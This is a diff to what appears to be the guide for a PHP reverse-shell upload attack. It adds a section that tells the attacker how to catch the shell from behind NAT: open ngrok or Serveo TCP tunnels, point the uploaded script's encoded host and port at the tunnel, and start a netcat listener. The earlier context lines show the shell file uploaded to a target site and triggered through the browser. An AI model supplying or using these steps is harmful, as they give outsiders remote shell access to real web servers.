@@ -67,3 +67,56 @@ Open the uploaded file in a browser:
 http://target.com/uploads/login.phtml
 ```
 Once opened, your listener will get a reverse shell connection.
+
+## Using Tunneling (When Your IP is Not Public)
+If you're using mobile data or behind a router (NAT), your IP might not be public.
+In that case, the reverse shell can't reach your machine directly.
+
+To fix this, use TCP tunneling tools like Ngrok or Serveo.
+
+#### Ngrok (Recommended)
+Install Ngrok
+Run this command:
+
+```bash
+ngrok tcp 4444
+```
+It will show something like:
+
+```nginx
+Forwarding tcp://4.tcp.ngrok.io:18900
+```
+**Update your PHP script:**
+
+```php
+$ip_b64 = base64_encoded of 4.tcp.ngrok.io;
+$port = 18900;
+```
+**Start your listener:**
+
+```bash
+nc -lvnp 4444
+```
+#### Serveo
+
+**Run this command:**
+
+```bash
+ssh -R 2222:localhost:4444 serveo.net
+```
+**It will say something like:**
+
+```csharp
+Forwarding TCP connections from serveo.net:2222
+```
+**Update your PHP script:**
+
+```php
+$ip_b64 = base64_encoded of serveo.net;
+$port = 2222;
+```
+**Start your listener:**
+
+```bash
+nc -lvnp 4444
+```
